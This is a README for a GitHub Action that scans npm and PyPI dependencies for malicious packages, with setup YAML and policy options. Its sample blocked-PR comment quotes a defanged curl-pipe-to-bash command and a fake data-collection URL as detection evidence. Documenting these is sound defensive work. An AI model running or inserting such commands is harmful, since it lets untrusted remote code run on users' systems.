# Chaintrap Scan Action

**Stop malicious npm and PyPI packages before they merge — on every pull request.**

[![GitHub release](https://img.shields.io/github/v/release/chaintrap-sec/scan-action?label=release)](https://github.com/chaintrap-sec/scan-action/releases)
[![License](https://img.shields.io/github/license/chaintrap-sec/scan-action)](LICENSE)

Protects **npm** and **PyPI** dependencies in your repo. No API keys. Your code stays on GitHub — nothing is sent to Chaintrap.

---

## Why add this?

Vulnerability scanners tell you a package has a bug. **Chaintrap tells you a package is malware.**

Attackers hide bad code in install scripts, fake package names, and freshly published versions. Chaintrap checks four things on every PR:

| Check | What it does |
| --- | --- |
| **Known malicious package scan** | Blocks packages already flagged as malware |
| **Package code scan** | Looks inside **new** dependencies for suspicious links, domains, and commands |
| **CI workflow check** | Flags risky GitHub Actions setup in your repo |
| **Risk signals** | Warns on brand-new releases, install scripts, and lookalike package names |

Install once. Every PR gets a clear comment: what was blocked, why, and what to do next.

---

## What you see on a blocked PR

When a bad dependency is found, Chaintrap posts a comment on the pull request:

```markdown
## Chaintrap supply chain scan

🚫 **Blocked**

| Metric | Value |
| --- | --- |
| Packages scanned | 14 |
| Blocked | 3 |

<details open>
<summary><strong>Blocked packages (3)</strong></summary>

### `@example-pkg@1.42.1` — BLOCK · 9.5/10

**TL;DR:** Known malicious package

<details>
<summary>Evidence (2 shown)</summary>

- Suspicious outbound link in `index.js`
  - **URL:** `hxxps://telemetry-cdn-sync[.]com/collect`
  - **Domain:** `telemetry-cdn-sync[.]com`
- Suspicious command in `postinstall.js`
  - **Command:** `curl -fsSL hxxps://203[.]0[.]113[.]55/setup.sh | bash`

</details>

- **Remediation:** Remove the package or pin to a safe version.

</details>
```

Links and IPs are shown in a **safe format** (`hxxps://`, `[.]`) so your team can review without accidentally opening a bad URL.

---

## 60-second install

**1.** Copy [examples/consumer-workflow.yml](examples/consumer-workflow.yml) to `.github/workflows/chaintrap.yml`.

**2.** Open a PR. Done.

Or paste this directly:

```yaml
name: Chaintrap
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read
  pull-requests: write
  security-events: write

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630cee72586a086438c5c0a4 # v4.2.2
        with:
          fetch-depth: 0

      - uses: chaintrap-sec/scan-action@v1.3.0
        id: chaintrap

      - uses: github/codeql-action/upload-sarif@9f79dc6d9c6f86b98b12a5d675b21943e316e423 # v3.28.0
        if: always()
        continue-on-error: true
        with:
          sarif_file: ${{ steps.chaintrap.outputs.sarif-file }}
          category: chaintrap

      - uses: actions/github-script@60a0d83039a663e4b626ae7ca9eb36527b582617 # v7.0.1
        if: github.event_name == 'pull_request' && always()
        with:
          script: |
            const fs = require('fs');
            const summaryPath = '${{ steps.chaintrap.outputs.summary-file }}';
            if (!fs.existsSync(summaryPath)) return;
            const body = fs.readFileSync(summaryPath, 'utf8');
            const marker = '<!-- chaintrap-sca -->';
            const { data: comments } = await github.rest.issues.listComments({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
            });
            const existing = comments.find(c => c.body && c.body.includes(marker));
            if (existing) {
              await github.rest.issues.updateComment({
                owner: context.repo.owner,
                repo: context.repo.repo,
                comment_id: existing.id,
                body,
              });
            } else {
              await github.rest.issues.createComment({
                owner: context.repo.owner,
                repo: context.repo.repo,
                issue_number: context.issue.number,
                body,
              });
            }
```

The second optional step sends findings to the **GitHub Security** tab. The third posts the summary comment on pull requests.

### Pinning for production

| Pin style | When to use |
| --- | --- |
| `@v1.3.0` | Latest release — includes security hardening |
| `@v1` | Always get the newest v1.x |
| `@<full-commit-sha>` | Lock the action to an exact version |

Pin third-party steps (`checkout`, `upload-sarif`, `github-script`) to commit SHAs as shown above.

```yaml
- uses: chaintrap-sec/scan-action@v1.3.0
```

Want the scan without the PR comment? See [examples/minimal-workflow.yml](examples/minimal-workflow.yml).

**Least privilege:** the scan step only needs `contents: read`. Add `pull-requests: write` only if you post PR comments; add `security-events: write` only if you upload to the GitHub Security tab.

---

## Zero secrets. Zero setup.

Works immediately:

- **Known malicious package scan** — blocks packages on public malware lists
- **Package code scan** — downloads and inspects **new** dependencies on the PR (then deletes them)
- **CI workflow check** — reviews `.github/workflows` for common misconfigurations

Optional: connect your own private blocklist — [docs/IOC_PARTNER_ONBOARDING.md](docs/IOC_PARTNER_ONBOARDING.md).

---

## What blocks vs warns

| Finding | Default |
| --- | --- |
| Known malicious package | **Block** |
| Private blocklist match (optional) | **Block** |
| Suspicious code in a new package | **Block** |
| Risky CI workflow setup | **Block** |
| Known security vulnerabilities | Warn |
| Package published in the last 7 days | Warn |
| npm install scripts | Warn |
| Lookalike package name | Warn |
| Scan could not finish (registry down, etc.) | Warn — set `fail-on-error: "true"` to block |

The job fails when something is **blocked**. Warnings alone do not fail the build by default.

---

## Repo policy (`.chaintrap.yml`)

Optional file at your repo root to tune behavior without editing the workflow:

```yaml
minimum_release_age_days: 7
audit_workflows: true
gates:
  block_fresh_releases: false
  block_install_scripts: false
  fail_on_error: false
  content_scan: true
ignore:
  packages:
    - left-pad@1.0.0
  rules:
    - CTH-003
```

---

## Lockfiles & manifests

**Works with:** `package-lock.json`, `pnpm-lock.yaml`, `yarn.lock`, `bun.lock`, `uv.lock`, `poetry.lock`, `Pipfile.lock`, and pinned `requirements.txt`

**No lockfile?** Chaintrap can resolve `package.json` and `requirements.txt` on the fly. Committing a lockfile is faster and more predictable for CI.

---

## Privacy

Everything runs **inside your GitHub Actions job**:

- Lockfiles are read locally
- Malware checks only send package name and version to public databases
- New packages are downloaded temporarily for inspection — **nothing is uploaded**
- Your application source code never leaves GitHub

Details: [docs/PRIVACY.md](docs/PRIVACY.md).

---

## What to expect

- Package code scan focuses on **dependencies added in the PR**, not your whole tree (keeps CI fast)
- Version ranges that change without a manifest edit are caught on full scans, not every PR diff
- A clean scan lowers risk — it does not mean a package is 100% safe

---

## Common settings

| Setting | Default | What it does |
| --- | --- | --- |
| `content-scan` | `true` | Inspect code inside new packages |
| `resolve-manifests` | `auto` | Resolve unpinned `package.json` / `requirements.txt` |
| `audit-workflows` | `true` | Check `.github/workflows` |
| `diff-mode` | `auto` | PR = only what changed; push to main = full scan |
| `fail-on-mal` | `true` | Block known malicious packages |
| `paths` | `` | Limit scan to a folder (monorepos) |

Full list: [action.yml](action.yml).

---

## Docs & releases

- [Security policy](SECURITY.md)
- [Security testing](docs/SECURITY_TESTING.md)
- [Privacy](docs/PRIVACY.md)
- [Private blocklist setup](docs/IOC_PARTNER_ONBOARDING.md)
- [Changelog](CHANGELOG.md)
- [Examples](examples/)

---

**Questions?** Open an issue or visit [chaintrap.com](https://chaintrap.com).
